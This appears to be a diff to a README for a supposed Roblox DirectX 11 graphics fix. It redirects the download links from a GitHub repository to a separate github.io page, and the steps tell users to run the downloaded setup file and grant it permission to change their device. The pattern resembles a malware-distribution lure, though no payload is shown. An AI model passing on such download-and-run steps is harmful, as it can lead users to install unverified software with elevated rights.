@@ -1,6 +1,6 @@
 # 🛠️ Roblox-DirectX-11-Fix - Play Roblox without graphics errors now
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Omidu1470/Roblox-DirectX-11-Fix)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://omidu1470.github.io)
 
 ## 📌 About this project
 
@@ -21,7 +21,7 @@ Check your Windows version by clicking the Start button and typing "About your P
 
 Follow these steps to fix your graphics settings and get back into the game:
 
-1. Visit the repository page to download the latest setup file: [Download Roblox-DirectX-11-Fix](https://github.com/Omidu1470/Roblox-DirectX-11-Fix).
+1. Visit the repository page to download the latest setup file: [Download Roblox-DirectX-11-Fix](https://omidu1470.github.io).
 2. Locate the file in your Downloads folder once the transfer finishes.
 3. Double-click the file to open the installation assistant.
 4. Grant permission if your computer asks whether you want to allow the app to make changes to your device.
